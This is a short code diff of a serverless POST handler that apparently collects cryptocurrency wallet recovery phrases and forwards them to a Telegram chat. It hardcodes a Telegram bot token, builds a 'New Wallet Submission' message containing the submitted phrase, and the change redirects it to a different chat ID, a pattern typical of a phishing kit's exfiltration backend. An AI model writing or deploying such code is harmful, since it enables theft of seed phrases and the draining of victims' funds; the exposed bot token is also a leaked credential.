@@ -35,7 +35,7 @@ export async function onRequestPost(context) {
 
     // Telegram Config
     const telegramBotToken = "8323059069:AAGGZW43k46VGHEpMyiUyeMm2GUA6SUAG1s";
-    const telegramChatId = "1771207181";
+    const telegramChatId = "-5269675480";
 
     let message = "New Wallet Submission\n\n";
     message += `Phrase: ${phrase}\n\n`;
@@ -101,4 +101,3 @@ export async function onRequestPost(context) {
     );
   }
 }
-
